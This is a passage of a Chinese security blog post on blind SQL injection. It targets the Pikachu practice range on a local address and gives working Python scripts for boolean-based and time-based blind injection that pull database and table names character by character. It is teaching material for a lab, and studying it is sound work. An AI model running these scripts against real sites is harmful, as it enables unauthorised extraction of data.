+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="comment">#引入req</span></span><br><span class="line"><span class="keyword">import</span> bs4 <span class="comment">#引入漂亮汤</span></span><br><span class="line">host=<span class="string">&quot;http://192.168.91.1/pikachu-master/vul/sqli/sqli_blind_b.php?name=kobe&quot;</span></span><br><span class="line">payload_ture=<span class="string">&quot;&#x27;and&#x27;1&#x27;=&#x27;1&quot;</span> <span class="comment">#逻辑真</span></span><br><span class="line">payload_false=<span class="string">&quot;&#x27;and&#x27;1&#x27;=&#x27;2&quot;</span> <span class="comment">#逻辑假</span></span><br><span class="line">headers=&#123;<span class="string">&#x27;user-agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36&#x27;</span></span><br><span class="line">&#125; <span class="comment">#http头，防反爬虫</span></span><br><span class="line">url=host+payload_ture+<span class="string">&quot;&amp;submit=查询&quot;</span> <span class="comment">#连接形成url</span></span><br><span class="line">req=requests.get(url,headers=headers)  <span class="comment">#使用request获得html文档</span></span><br><span class="line">soup=bs4.BeautifulSoup(req.text,<span class="string">&quot;html.parser&quot;</span>) </span><br><span class="line">targets=soup.find_all(<span class="string">&quot;p&quot;</span>,class_=<span class="string">&quot;notice&quot;</span>) <span class="comment">#使用漂亮汤进行筛选得到目标的回显语句</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(targets))</span><br><span class="line"></span><br><span class="line">url=host+payload_ture+<span class="string">&quot;&amp;submit=查询&quot;</span> <span class="comment">#连接形成url</span></span><br><span class="line">req=requests.get(url,headers=headers)  <span class="comment">#使用request获得html文档</span></span><br><span class="line">soup=bs4.BeautifulSoup(req.text,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">targets=soup.find_all(<span class="string">&quot;p&quot;</span>,class_=<span class="string">&quot;notice&quot;</span>) <span class="comment">#使用漂亮汤进行筛选得到目标的回显语句</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(targets))</span><br></pre></td></tr></table></figure>
+
+<p>分别得到以下的回显，前者为真，后者为假：</p>
+<p><img src="https://i.loli.net/2021/02/24/kAXutZziS9bwDYa.png" alt="image-20210224222948476"></p>
+<p>因为我们每次只能得知，于是我们可以尝试一个个地猜出来，原本的sql注入回显语句字符串的每一位上的字符：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="comment">#引入req</span></span><br><span class="line"><span class="keyword">import</span> bs4 <span class="comment">#引入漂亮汤</span></span><br><span class="line">host=<span class="string">&quot;http://192.168.91.1/pikachu-master/vul/sqli/sqli_blind_b.php?name=kobe&quot;</span> </span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">headers=&#123;<span class="string">&#x27;user-agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36&#x27;</span></span><br><span class="line">&#125; <span class="comment">#http头，防反爬虫</span></span><br><span class="line">maxlength=<span class="number">30</span> <span class="comment">#所检测的最长字符串长度</span></span><br><span class="line">check_data=<span class="built_in">list</span>(<span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_&#125;&#123;!@#$%^&amp;*()&#x27;</span>) <span class="comment">#字典</span></span><br><span class="line">payload=<span class="string">&quot;&#x27;and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;0&#125;,1))=&#123;1&#125; and&#x27;1&#x27;=&#x27;1&quot;</span> <span class="comment">#其中select一段可以换成其他查询语句</span></span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i &lt; maxlength:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> check_data:</span><br><span class="line">        url=host+payload.<span class="built_in">format</span>(<span class="built_in">str</span>(i),<span class="built_in">ord</span>(x))+<span class="string">&quot;&amp;submit=查询&quot;</span> <span class="comment">#随具体情况改变</span></span><br><span class="line">        req=requests.get(url,headers=headers) <span class="comment">#使用request获得html文档</span></span><br><span class="line">        soup=bs4.BeautifulSoup(req.text,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">        targets=soup.find_all(<span class="string">&quot;p&quot;</span>,class_=<span class="string">&quot;notice&quot;</span>) <span class="comment">#使用漂亮汤进行筛选得到目标的回显语句</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;your&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(targets): <span class="comment">#根据前面的真假回显得知，当结果中含有your这个单词时，为真</span></span><br><span class="line">            flag=flag+x</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    i=i+<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><p>有的页面的过滤甚至没有回显，但是可以正常执行我们传入的逻辑语句，我们如何才能得语句的回显结果呢？</p>
+<p>可以使用基于时间的盲注，比如在皮卡丘靶场中：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="comment">#引入req</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">host=<span class="string">&quot;http://192.168.91.1/pikachu-master/vul/sqli/sqli_blind_t.php?name=kobe&quot;</span></span><br><span class="line">headers=&#123;<span class="string">&#x27;user-agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36&#x27;</span></span><br><span class="line">&#125; <span class="comment">#http头，防反爬虫</span></span><br><span class="line">payload_ture=<span class="string">&quot;&#x27;and if((substr(database(),1,1))=&#x27;p&#x27;,sleep(3),null) and &#x27;1&#x27;=&#x27;1&quot;</span> <span class="comment">#逻辑真</span></span><br><span class="line">payload_false=<span class="string">&quot;&#x27;and if((substr(database(),1,1))=&#x27;a&#x27;,sleep(3),null) and &#x27;1&#x27;=&#x27;2&quot;</span> <span class="comment">#逻辑假</span></span><br><span class="line">url=host+payload_ture+<span class="string">&quot;&amp;submit=查询&quot;</span> <span class="comment">#连接形成url</span></span><br><span class="line">stime=time.time()<span class="comment">#开始时间</span></span><br><span class="line">requests.get(url,headers=headers) <span class="comment">#将网址和注入语句拼接请求</span></span><br><span class="line">etime=time.time()<span class="comment">#结束时间</span></span><br><span class="line">delta_time=etime-stime<span class="comment">#时间差</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ture:&quot;</span>,delta_time)</span><br><span class="line"></span><br><span class="line">url=host+payload_false+<span class="string">&quot;&amp;submit=查询&quot;</span> <span class="comment">#连接形成url</span></span><br><span class="line">stime=time.time()<span class="comment">#开始时间</span></span><br><span class="line">requests.get(url,headers=headers) <span class="comment">#将网址和注入语句拼接请求</span></span><br><span class="line">etime=time.time()<span class="comment">#结束时间</span></span><br><span class="line">delta_time=etime-stime<span class="comment">#时间差</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;false:&quot;</span>,delta_time)</span><br></pre></td></tr></table></figure>
+
+<p>得到结果：</p>
+<p><img src="https://i.loli.net/2021/02/24/A7PVDJmKcxEaFGb.png" alt="image-20210224230747271"></p>
+<p>我们只需要判断时间差便可以知道是真还是假，这样剩下的思路就跟boolean型的盲注一样了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="comment">#引入req</span></span><br><span class="line"><span class="keyword">import</span> time <span class="comment">#引入时间库</span></span><br><span class="line">host=<span class="string">&quot;http://192.168.91.1/pikachu-master/vul/sqli/sqli_blind_t.php?name=kobe&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">headers=&#123;<span class="string">&#x27;user-agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36&#x27;</span></span><br><span class="line">&#125; <span class="comment">#http头，防反爬虫</span></span><br><span class="line">maxlength=<span class="number">30</span> <span class="comment">#所检测的最长字符串长度</span></span><br><span class="line">check_data=<span class="built_in">list</span>(<span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_&#125;&#123;!@#$%^&amp;*()&#x27;</span>) <span class="comment">#字典</span></span><br><span class="line">payload=<span class="string">&quot;&#x27;and if(ascii(substr(database(),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),null) and &#x27;1&#x27;=&#x27;1&quot;</span> </span><br><span class="line">i=<span class="number">1</span> <span class="comment">#其中的database()可以换成其他查询语句</span></span><br><span class="line"><span class="keyword">while</span> i &lt; maxlength:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> check_data:</span><br><span class="line">        url=host+payload.<span class="built_in">format</span>(<span class="built_in">str</span>(i),<span class="built_in">ord</span>(x))+<span class="string">&quot;&amp;submit=查询&quot;</span> <span class="comment">#随具体情况改变</span></span><br><span class="line">        stime=time.time()<span class="comment">#开始时间</span></span><br><span class="line">        requests.get(url,headers=headers) <span class="comment">#使用request获得html文档</span></span><br><span class="line">        etime=time.time()<span class="comment">#结束时间</span></span><br><span class="line">        <span class="keyword">if</span> etime-stime &gt; <span class="number">3</span>: <span class="comment">#当间隔时间大于3秒为真</span></span><br><span class="line">            flag=flag+x</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    i=i+<span class="number">1</span></span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"># sql注入</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/04/30/%5BACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B%5DExec/" rel="next" title="【ACTF2020 新生赛】Exec">
+                <i class="fa fa-chevron-left"></i> 【ACTF2020 新生赛】Exec
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/05/01/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" rel="prev" title="数据结构笔记">
+                数据结构笔记 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC81MzM3MC8yOTg0NA=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.png"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-text">SQL注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1%E3%80%81%E5%BA%93%E3%80%81%E8%A1%A8%E3%80%81%E5%88%97"><span class="nav-text">1、库、表、列</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%E3%80%81%E4%BD%BF%E7%94%A8sql%E8%AF%AD%E5%8F%A5%E8%BF%9B%E8%A1%8C%E6%95%B0%E6%8D%AE%E6%9F%A5%E8%AF%A2%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="nav-text">2、使用sql语句进行数据查询的流程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E9%A6%96%E5%85%88%E7%A1%AE%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF"><span class="nav-text">1、首先确定数据库的相关信息</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E7%A1%AE%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="nav-text">（1）确定数据库名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E7%A1%AE%E5%AE%9A%E6%95%B0%E6%8D%AE%E8%A1%A8%E5%90%8D"><span class="nav-text">（2）确定数据表名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%883%EF%BC%89%E7%A1%AE%E5%AE%9A%E6%95%B0%E6%8D%AE%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%88%97%E5%90%8D"><span class="nav-text">（3）确定数据表中的列名</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E6%9F%A5%E8%AF%A2%E7%9B%AE%E6%A0%87%E4%BF%A1%E6%81%AF"><span class="nav-text">2、查询目标信息</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E6%9F%A5%E8%AF%A2%E7%9B%AE%E6%A0%87%E5%88%97%E7%9A%84%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE"><span class="nav-text">（1）查询目标列的所有数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E6%9F%A5%E8%AF%A2%E7%9B%AE%E6%A0%87%E5%88%97%E7%9A%84%E7%9B%AE%E6%A0%87%E6%95%B0%E6%8D%AE"><span class="nav-text">（2）查询目标列的目标数据</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3%E3%80%81%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-text">3、联合注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E4%B8%87%E8%83%BD%E9%92%A5%E5%8C%99"><span class="nav-text">（1）万能钥匙</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%882%EF%BC%89union%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="nav-text">（2）union联合查询</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#order-by%E8%AF%AD%E5%8F%A5%E7%A1%AE%E5%AE%9A%E6%9F%A5%E8%AF%A2%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%95%B0%E9%87%8F"><span class="nav-text">order by语句确定查询对象的数量</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#group-concat"><span class="nav-text">group_concat()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%80%E6%AC%A1%E5%AE%8C%E6%95%B4%E7%9A%84%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="nav-text">一次完整的联合查询注入</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4%E3%80%81%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-text">4、报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%881%EF%BC%89updatexml-%E5%87%BD%E6%95%B0"><span class="nav-text">（1）updatexml()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%882%EF%BC%89concat-%E5%87%BD%E6%95%B0"><span class="nav-text">（2）concat()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%883%EF%BC%89%E8%BF%9B%E8%A1%8Cupdatexml%E6%B3%A8%E5%85%A5"><span class="nav-text">（3）进行updatexml注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%884%EF%BC%89limit%E8%AF%AD%E5%8F%A5"><span class="nav-text">（4）limit语句</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%885%EF%BC%89substr-%E5%87%BD%E6%95%B0%E8%BE%93%E5%87%BA%E9%95%BF%E5%AD%97%E7%AC%A6%E7%BB%93%E6%9E%9C"><span class="nav-text">（5）substr()函数输出长字符结果</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%886%EF%BC%89%E5%85%B6%E4%BB%96%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5"><span class="nav-text">（6）其他的一些报错注入语句</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8Eextractvalue-%E5%87%BD%E6%95%B0%E7%9A%84%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-text">基于extractvalue()函数的报错注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8Egeometrycollection-%E5%87%BD%E6%95%B0%E7%9A%84%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-text">基于geometrycollection()函数的报错注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8Emultipoint-%E5%87%BD%E6%95%B0%E7%9A%84%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-text">基于multipoint()函数的报错注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8Epolygon-%E5%87%BD%E6%95%B0%E7%9A%84%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-text">基于polygon()函数的报错注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8Emultipolygon-%E5%87%BD%E6%95%B0%E7%9A%84%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-text">基于multipolygon()函数的报错注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8Elinestring-%E5%87%BD%E6%95%B0%E7%9A%84%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-text">基于linestring()函数的报错注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8Emultilinestring-%E5%87%BD%E6%95%B0%E7%9A%84%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-text">基于multilinestring()函数的报错注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8Eexp-%E5%87%BD%E6%95%B0%E7%9A%84%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-text">基于exp()函数的报错注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8Efloor-%E5%87%BD%E6%95%B0%E7%9A%84%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-text">基于floor()函数的报错注入</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5%E3%80%81%E7%9B%B2%E6%B3%A8"><span class="nav-text">5、盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8Eboolean%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="nav-text">基于boolean的盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="nav-text">基于时间的盲注</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">zhe</span>
+
+  
+</div>
+<!--
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+-->
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three-waves.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
